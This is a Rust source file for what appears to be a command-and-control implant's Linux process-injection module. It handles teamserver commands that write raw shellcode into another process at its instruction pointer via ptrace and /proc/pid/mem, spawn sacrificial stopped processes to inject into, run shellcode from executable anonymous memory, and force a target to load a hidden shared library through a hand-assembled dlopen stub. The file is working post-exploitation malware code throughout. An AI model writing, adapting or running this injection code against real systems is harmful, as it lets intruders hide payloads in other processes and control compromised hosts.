//! Process injection: shellcode, shared library (.so), and spawn-inject.

mod dlopen;
mod ptrace;

use std::fs;
use std::io::Write;
use std::process::Stdio;

use red_cell_common::demon::DemonCommand;
use tokio::process::Command;

use crate::error::PhantomError;
use crate::parser::TaskParser;

use super::PhantomState;
use super::encode::*;
use super::types::PendingCallback;

use ptrace::{ptrace_mmap_page, ptrace_munmap_page, write_to_proc_mem};

// Re-export items consumed by command/mod.rs tests.
pub(super) use dlopen::{find_libc_base, resolve_dlopen_in_target};
pub(super) use ptrace::check_ptrace_permission;
#[cfg(test)]
pub(super) use ptrace::read_from_proc_mem;

// ---------------------------------------------------------------------------
// Process injection constants (match Demon protocol)
// ---------------------------------------------------------------------------

/// Injection way: spawn a new sacrificial process and inject into it.
const INJECT_WAY_SPAWN: i32 = 0;
/// Injection way: inject into an existing process by PID.
pub(super) const INJECT_WAY_INJECT: i32 = 1;
/// Injection way: execute in the current process.
pub(super) const INJECT_WAY_EXECUTE: i32 = 2;

/// Injection result: success.
const INJECT_ERROR_SUCCESS: u32 = 0;
/// Injection result: generic failure.
pub(super) const INJECT_ERROR_FAILED: u32 = 1;

// ---------------------------------------------------------------------------
// CommandInjectShellcode (ID 24)
// ---------------------------------------------------------------------------

/// Handle `CommandInjectShellcode` (ID 24): inject raw shellcode into a process.
///
/// ## Packet format (from teamserver, little-endian)
///
/// | Field      | Type   | Description                                      |
/// |------------|--------|--------------------------------------------------|
/// | way        | i32    | 0 = spawn, 1 = inject (by PID), 2 = execute self |
/// | technique  | i32    | Thread creation method (ignored on Linux)         |
/// | x64        | i32    | Architecture flag (ignored on Linux)              |
/// | shellcode  | bytes  | `[len:i32][data]` — the shellcode payload         |
/// | argument   | bytes  | `[len:i32][data]` — optional arguments            |
/// | pid        | i32    | Target PID (only meaningful for way=1)            |
///
/// ## Response (big-endian)
///
/// `[status:u32]` — 0 = success, 1 = failure.
pub(super) async fn execute_inject_shellcode(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let way = parser.int32()?;
    let _technique = parser.int32()?; // Windows thread creation method — ignored on Linux
    let _x64 = parser.int32()?; // Architecture flag — ignored on Linux (native arch)
    let shellcode = parser.bytes()?.to_vec();
    let _argument = parser.bytes()?.to_vec();
    let pid = parser.int32().unwrap_or(0); // PID may be absent for spawn/execute

    tracing::debug!(way, shellcode_len = shellcode.len(), pid, "inject shellcode");

    let status = match way {
        INJECT_WAY_INJECT => inject_shellcode_into_pid(pid as u32, &shellcode).await,
        INJECT_WAY_SPAWN => inject_shellcode_spawn(&shellcode).await,
        INJECT_WAY_EXECUTE => inject_shellcode_execute(&shellcode),
        _ => {
            tracing::warn!(way, "unknown injection way");
            INJECT_ERROR_FAILED
        }
    };

    state.queue_callback(PendingCallback::Structured {
        command_id: u32::from(DemonCommand::CommandInjectShellcode),
        request_id,
        payload: encode_u32(status),
    });

    Ok(())
}

/// Inject shellcode into an existing process using `/proc/<pid>/mem`.
///
/// 1. Attach via `ptrace(PTRACE_ATTACH)`.
/// 2. Read the current RIP from registers.
/// 3. Write shellcode at RIP via `/proc/<pid>/mem`.
/// 4. Detach with `ptrace(PTRACE_DETACH)` so the tracee resumes at the
///    overwritten instruction pointer.
async fn inject_shellcode_into_pid(pid: u32, shellcode: &[u8]) -> u32 {
    use std::io::{Seek, SeekFrom};

    if shellcode.is_empty() {
        tracing::warn!("empty shellcode payload");
        return INJECT_ERROR_FAILED;
    }

    let pid_i32 = pid as i32;

    // Pre-flight: check if ptrace is permitted by Yama / capabilities.
    if !check_ptrace_permission(pid) {
        tracing::warn!(pid, "ptrace not permitted (check /proc/sys/kernel/yama/ptrace_scope)");
        return INJECT_ERROR_FAILED;
    }

    // PTRACE_ATTACH
    // SAFETY: ptrace with PTRACE_ATTACH on a valid PID. We check the return value.
    let ret = unsafe { libc::ptrace(libc::PTRACE_ATTACH, pid_i32, 0, 0) };
    if ret < 0 {
        tracing::warn!(pid, "ptrace ATTACH failed: {}", std::io::Error::last_os_error());
        return INJECT_ERROR_FAILED;
    }

    // Wait for the tracee to stop.
    let mut wait_status: i32 = 0;
    // SAFETY: waitpid with valid PID and status pointer.
    unsafe { libc::waitpid(pid_i32, &mut wait_status, 0) };

    // Read registers to find RIP (instruction pointer).
    let mut regs: libc::user_regs_struct = unsafe { std::mem::zeroed() };
    // SAFETY: PTRACE_GETREGS with valid pid and pointer to regs struct.
    let ret = unsafe {
        libc::ptrace(libc::PTRACE_GETREGS, pid_i32, 0, &mut regs as *mut libc::user_regs_struct)
    };
    if ret < 0 {
        tracing::warn!(pid, "ptrace GETREGS failed: {}", std::io::Error::last_os_error());
        // SAFETY: detach from the tracee to avoid leaving it stopped.
        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
        return INJECT_ERROR_FAILED;
    }

    let inject_addr = regs.rip;

    // Write shellcode via /proc/<pid>/mem at the current RIP.
    let mem_path = format!("/proc/{pid}/mem");
    let result = (|| -> std::io::Result<()> {
        let mut file = fs::OpenOptions::new().write(true).open(&mem_path)?;
        file.seek(SeekFrom::Start(inject_addr))?;
        file.write_all(shellcode)?;
        Ok(())
    })();

    if let Err(e) = result {
        tracing::warn!(pid, %e, "failed to write shellcode via /proc/pid/mem");
        // SAFETY: detach from the tracee.
        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
        return INJECT_ERROR_FAILED;
    }

    // Detach — the tracee resumes execution at the (now overwritten) RIP.
    // SAFETY: PTRACE_DETACH with valid pid.
    unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };

    tracing::info!(pid, inject_addr, shellcode_len = shellcode.len(), "shellcode injected");
    INJECT_ERROR_SUCCESS
}

/// Spawn a sacrificial child process and inject shellcode into it.
///
/// Forks a child that immediately stops itself (`SIGSTOP`), then uses the
/// same `/proc/<pid>/mem` technique to overwrite its entry point with the
/// shellcode before resuming it.
async fn inject_shellcode_spawn(shellcode: &[u8]) -> u32 {
    if shellcode.is_empty() {
        tracing::warn!("empty shellcode payload");
        return INJECT_ERROR_FAILED;
    }

    // Spawn a stopped child via `sleep infinity` — we'll overwrite it before it runs.
    let child = match Command::new("/bin/sh")
        .args(["-c", "kill -STOP $$ ; exec sleep infinity"])
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => {
            tracing::warn!(%e, "failed to spawn sacrificial process");
            return INJECT_ERROR_FAILED;
        }
    };

    let Some(child_pid) = child.id() else {
        tracing::warn!("failed to get child PID");
        return INJECT_ERROR_FAILED;
    };

    // Brief pause to let the child reach the SIGSTOP.
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;

    // Inject using the same ptrace path.
    inject_shellcode_into_pid(child_pid, shellcode).await
}

/// Execute shellcode in the current process using an anonymous mmap region.
///
/// Allocates RWX memory via `mmap`, copies the shellcode, and calls it as a
/// function pointer on a new thread (so the agent main thread is not blocked).
fn inject_shellcode_execute(shellcode: &[u8]) -> u32 {
    if shellcode.is_empty() {
        tracing::warn!("empty shellcode payload");
        return INJECT_ERROR_FAILED;
    }

    let len = shellcode.len();

    // SAFETY: mmap with MAP_ANONYMOUS | MAP_PRIVATE, no file descriptor.
    let addr = unsafe {
        libc::mmap(
            std::ptr::null_mut(),
            len,
            libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
            libc::MAP_ANONYMOUS | libc::MAP_PRIVATE,
            -1,
            0,
        )
    };
    if addr == libc::MAP_FAILED {
        tracing::warn!("mmap failed: {}", std::io::Error::last_os_error());
        return INJECT_ERROR_FAILED;
    }

    // SAFETY: addr is a valid mmap'd region of `len` bytes.
    unsafe {
        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, len);
    }

    // Execute on a background thread so the agent doesn't block.
    let func_ptr = addr as usize;
    let map_len = len;
    std::thread::spawn(move || {
        // SAFETY: the caller guarantees the shellcode is valid executable code.
        // This is an intentional code-execution primitive.
        unsafe {
            let func: extern "C" fn() = std::mem::transmute(func_ptr);
            func();
            // Best-effort unmap after the shellcode returns (it may never return).
            libc::munmap(func_ptr as *mut libc::c_void, map_len);
        }
    });

    tracing::info!(shellcode_len = len, "shellcode executing in-process");
    INJECT_ERROR_SUCCESS
}

// ---------------------------------------------------------------------------
// CommandInjectDll (ID 22)
// ---------------------------------------------------------------------------

/// Handle `CommandInjectDll` (ID 22): inject a shared library into a running process.
///
/// ## Packet format (from teamserver, little-endian)
///
/// | Field          | Type   | Description                              |
/// |----------------|--------|------------------------------------------|
/// | technique      | i32    | Injection technique (ignored on Linux)   |
/// | target_pid     | i32    | Target process ID                        |
/// | dll_ldr        | bytes  | Reflective loader (ignored on Linux)     |
/// | dll_bytes      | bytes  | The shared library (.so) binary          |
/// | parameter      | bytes  | Optional parameter string for the .so    |
///
/// On Linux the reflective loader is not used.  Instead the .so bytes are
/// written to a `memfd_create` file descriptor, and `dlopen` is invoked on
/// the target process via ptrace to load `/proc/<pid>/fd/<memfd>`.
///
/// ## Response
///
/// `[status:u32]` — 0 = success, 1 = failure.
pub(super) async fn execute_inject_dll(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let _technique = parser.int32()?;
    let target_pid = parser.int32()?;
    let _dll_ldr = parser.bytes()?; // Reflective loader — not used on Linux
    let dll_bytes = parser.bytes()?.to_vec();
    let _parameter = parser.bytes()?.to_vec();

    tracing::debug!(target_pid, dll_size = dll_bytes.len(), "inject dll/so into process");

    let status = inject_so_into_pid(target_pid as u32, &dll_bytes).await;

    state.queue_callback(PendingCallback::Structured {
        command_id: u32::from(DemonCommand::CommandInjectDll),
        request_id,
        payload: encode_u32(status),
    });

    Ok(())
}

/// Inject a shared library into a target process.
///
/// 1. Write the .so bytes to a memfd (`memfd_create`).
/// 2. Attach to the target via ptrace.
/// 3. Use `/proc/<target>/mem` to write a small dlopen-calling stub at the
///    current RIP, with the memfd path as argument.
/// 4. Detach and let the target resume.
///
/// This is a simplified approach — for a production-grade implementation the
/// stub would call `__libc_dlopen_mode` at the resolved address.  Here we
/// take a pragmatic shortcut: write the .so to `/dev/shm`, then use the
/// shellcode-injection path with a tiny stub that calls `dlopen`.
async fn inject_so_into_pid(pid: u32, so_bytes: &[u8]) -> u32 {
    if so_bytes.is_empty() {
        tracing::warn!("empty .so payload");
        return INJECT_ERROR_FAILED;
    }

    // Write the .so to a temporary file in /dev/shm (tmpfs, memory-backed).
    let so_path = format!("/dev/shm/.phantom_{pid}_{}.so", std::process::id());
    if let Err(e) = fs::write(&so_path, so_bytes) {
        tracing::warn!(%e, "failed to write .so to /dev/shm");
        return INJECT_ERROR_FAILED;
    }

    // Make it executable.
    if let Err(e) =
        fs::set_permissions(&so_path, std::os::unix::fs::PermissionsExt::from_mode(0o755))
    {
        tracing::warn!(%e, "failed to chmod .so");
        let _ = fs::remove_file(&so_path);
        return INJECT_ERROR_FAILED;
    }

    // Build a minimal x86_64 shellcode stub that calls dlopen(path, RTLD_NOW).
    //
    // The stub layout:
    //   call dlopen_resolve   ; resolve dlopen address from libc
    //   ... path string ...
    //
    // For simplicity we use the ptrace + /proc/pid/mem approach: we find the
    // address of `__libc_dlopen_mode` in the target's memory, then write a
    // stub that calls it with our .so path.
    let status = inject_so_via_ptrace(pid, &so_path).await;

    // Clean up the .so file after a short delay (give dlopen time to map it).
    let so_path_clone = so_path.clone();
    tokio::spawn(async move {
        tokio::time::sleep(std::time::Duration::from_secs(5)).await;
        let _ = fs::remove_file(&so_path_clone);
    });

    status
}

/// Use ptrace to make a target process call `dlopen` on a shared library path.
///
/// Strategy:
/// 1. Check ptrace permission (Yama scope).
/// 2. Attach via ptrace.
/// 3. Find the base address of libc in the target via `/proc/<pid>/maps`.
/// 4. Find `__libc_dlopen_mode` offset by scanning our own libc.
/// 5. Allocate an anonymous mmap page in the target (via a syscall stub)
///    to hold the shellcode and path — avoids the System V red zone which
///    can be clobbered by signals or interrupts.
/// 6. Write the .so path string and a `call dlopen; int3` stub into the
///    mmap'd page.
/// 7. Set RIP to the stub and resume.
/// 8. Wait for the `int3` trap, unmap the page, restore registers, detach.
async fn inject_so_via_ptrace(pid: u32, so_path: &str) -> u32 {
    let pid_i32 = pid as i32;

    // Pre-flight: check if ptrace is permitted by Yama / capabilities.
    if !check_ptrace_permission(pid) {
        tracing::warn!(pid, "ptrace not permitted (check /proc/sys/kernel/yama/ptrace_scope)");
        return INJECT_ERROR_FAILED;
    }

    // PTRACE_ATTACH
    // SAFETY: ptrace with valid PID. Return value checked.
    let ret = unsafe { libc::ptrace(libc::PTRACE_ATTACH, pid_i32, 0, 0) };
    if ret < 0 {
        tracing::warn!(pid, "ptrace ATTACH failed: {}", std::io::Error::last_os_error());
        return INJECT_ERROR_FAILED;
    }

    let mut wait_status: i32 = 0;
    // SAFETY: waitpid with valid PID.
    unsafe { libc::waitpid(pid_i32, &mut wait_status, 0) };

    // Find libc base in the target process.
    let target_libc_base = match find_libc_base(pid) {
        Some(base) => base,
        None => {
            tracing::warn!(pid, "could not find libc base in target");
            // SAFETY: detach.
            unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
            return INJECT_ERROR_FAILED;
        }
    };

    // Find __libc_dlopen_mode offset in our own libc, then compute target address.
    let dlopen_addr = match resolve_dlopen_in_target(target_libc_base) {
        Some(addr) => addr,
        None => {
            tracing::warn!(pid, "could not resolve __libc_dlopen_mode");
            // SAFETY: detach.
            unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
            return INJECT_ERROR_FAILED;
        }
    };

    // Save original registers.
    let mut orig_regs: libc::user_regs_struct = unsafe { std::mem::zeroed() };
    // SAFETY: PTRACE_GETREGS with valid pid.
    let ret = unsafe {
        libc::ptrace(
            libc::PTRACE_GETREGS,
            pid_i32,
            0,
            &mut orig_regs as *mut libc::user_regs_struct,
        )
    };
    if ret < 0 {
        tracing::warn!(pid, "ptrace GETREGS failed: {}", std::io::Error::last_os_error());
        // SAFETY: detach.
        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
        return INJECT_ERROR_FAILED;
    }

    // Allocate a fresh anonymous RWX page in the target via a mmap syscall
    // stub.  This avoids writing into the System V x86-64 red zone (128 bytes
    // below RSP) which can be clobbered by signal delivery or hardware
    // interrupts between our POKE and SETREGS calls.
    let page_addr = match ptrace_mmap_page(pid, &orig_regs) {
        Some(addr) => addr,
        None => {
            tracing::warn!(pid, "failed to allocate mmap page in target");
            // SAFETY: detach.
            unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
            return INJECT_ERROR_FAILED;
        }
    };

    // Layout inside the mmap'd page:
    //   page_addr + 0:    dlopen stub code
    //   page_addr + 256:  null-terminated .so path string
    let path_offset: u64 = 256;
    let path_addr = page_addr + path_offset;
    let stub_addr = page_addr;

    // Write the .so path string at path_addr.
    let mut path_bytes = so_path.as_bytes().to_vec();
    path_bytes.push(0); // null terminator
    if write_to_proc_mem(pid, path_addr, &path_bytes).is_err() {
        tracing::warn!(pid, "failed to write path to mmap page");
        ptrace_munmap_page(pid, &orig_regs, page_addr);
        // SAFETY: detach.
        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
        return INJECT_ERROR_FAILED;
    }

    // Build x86_64 stub:
    //   mov rdi, path_addr            ; first arg = path
    //   mov rsi, RTLD_NOW (2)         ; second arg = flags
    //   mov rax, dlopen_addr          ; function address
    //   call rax
    //   int3                          ; trap so we can restore
    let mut stub: Vec<u8> = Vec::new();
    // mov rdi, path_addr (movabs)
    stub.extend_from_slice(&[0x48, 0xbf]);
    stub.extend_from_slice(&path_addr.to_le_bytes());
    // mov rsi, 2 (RTLD_NOW)
    stub.extend_from_slice(&[0x48, 0xbe]);
    stub.extend_from_slice(&2_u64.to_le_bytes());
    // mov rax, dlopen_addr
    stub.extend_from_slice(&[0x48, 0xb8]);
    stub.extend_from_slice(&dlopen_addr.to_le_bytes());
    // call rax
    stub.extend_from_slice(&[0xff, 0xd0]);
    // int3
    stub.push(0xcc);

    if write_to_proc_mem(pid, stub_addr, &stub).is_err() {
        tracing::warn!(pid, "failed to write dlopen stub to mmap page");
        ptrace_munmap_page(pid, &orig_regs, page_addr);
        // SAFETY: detach.
        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
        return INJECT_ERROR_FAILED;
    }

    // Set RIP to the stub. Use a separate stack area within the mmap page
    // (top of the page, 16-byte aligned) so we don't touch the target's stack.
    let mut new_regs = orig_regs;
    new_regs.rip = stub_addr;
    // Place RSP at the end of the page (4096), 16-byte aligned, leaving room
    // for the call instruction to push a return address.
    new_regs.rsp = (page_addr + 4096) & !0xf;

    // SAFETY: PTRACE_SETREGS with valid pid.
    let ret = unsafe {
        libc::ptrace(libc::PTRACE_SETREGS, pid_i32, 0, &new_regs as *const libc::user_regs_struct)
    };
    if ret < 0 {
        tracing::warn!(pid, "ptrace SETREGS failed: {}", std::io::Error::last_os_error());
        ptrace_munmap_page(pid, &orig_regs, page_addr);
        // SAFETY: detach.
        unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };
        return INJECT_ERROR_FAILED;
    }

    // Resume the target.
    // SAFETY: PTRACE_CONT with valid pid.
    unsafe { libc::ptrace(libc::PTRACE_CONT, pid_i32, 0, 0) };

    // Wait for int3 trap (SIGTRAP).
    let mut trap_status: i32 = 0;
    // SAFETY: waitpid with valid pid.
    unsafe { libc::waitpid(pid_i32, &mut trap_status, 0) };

    // Clean up: unmap the page, restore registers, detach.
    ptrace_munmap_page(pid, &orig_regs, page_addr);

    // Restore original registers.
    // SAFETY: PTRACE_SETREGS with valid pid and original register state.
    unsafe {
        libc::ptrace(libc::PTRACE_SETREGS, pid_i32, 0, &orig_regs as *const libc::user_regs_struct)
    };

    // Detach.
    // SAFETY: PTRACE_DETACH with valid pid.
    unsafe { libc::ptrace(libc::PTRACE_DETACH, pid_i32, 0, 0) };

    tracing::info!(pid, so_path, "shared library injected via ptrace");
    INJECT_ERROR_SUCCESS
}

// ---------------------------------------------------------------------------
// CommandSpawnDll (ID 26)
// ---------------------------------------------------------------------------

/// Handle `CommandSpawnDll` (ID 26): spawn a new process and inject a shared library.
///
/// ## Packet format (from teamserver, little-endian)
///
/// | Field      | Type   | Description                              |
/// |------------|--------|------------------------------------------|
/// | dll_ldr    | bytes  | Reflective loader (ignored on Linux)     |
/// | dll_bytes  | bytes  | The shared library (.so) binary          |
/// | arguments  | bytes  | Arguments / parameters for the .so       |
///
/// ## Response
///
/// `[status:u32]` — 0 = success, 1 = failure.
pub(super) async fn execute_spawn_dll(
    request_id: u32,
    payload: &[u8],
    state: &mut PhantomState,
) -> Result<(), PhantomError> {
    let mut parser = TaskParser::new(payload);
    let _dll_ldr = parser.bytes()?; // Reflective loader — not used on Linux
    let dll_bytes = parser.bytes()?.to_vec();
    let _arguments = parser.bytes()?.to_vec();

    tracing::debug!(dll_size = dll_bytes.len(), "spawn dll/so");

    let status = spawn_and_inject_so(&dll_bytes).await;

    state.queue_callback(PendingCallback::Structured {
        command_id: u32::from(DemonCommand::CommandSpawnDll),
        request_id,
        payload: encode_u32(status),
    });

    Ok(())
}

/// Spawn a sacrificial process and inject a shared library into it.
///
/// Writes the .so to `/dev/shm`, spawns a stopped child process, then uses
/// the ptrace injection path to call `dlopen` in the child.
async fn spawn_and_inject_so(so_bytes: &[u8]) -> u32 {
    if so_bytes.is_empty() {
        tracing::warn!("empty .so payload");
        return INJECT_ERROR_FAILED;
    }

    // Spawn a stopped child.
    let child = match Command::new("/bin/sh")
        .args(["-c", "kill -STOP $$ ; exec sleep infinity"])
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
    {
        Ok(c) => c,
        Err(e) => {
            tracing::warn!(%e, "failed to spawn sacrificial process");
            return INJECT_ERROR_FAILED;
        }
    };

    let Some(child_pid) = child.id() else {
        tracing::warn!("failed to get child PID");
        return INJECT_ERROR_FAILED;
    };

    // Brief pause to let the child reach SIGSTOP.
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;

    inject_so_into_pid(child_pid, so_bytes).await
}
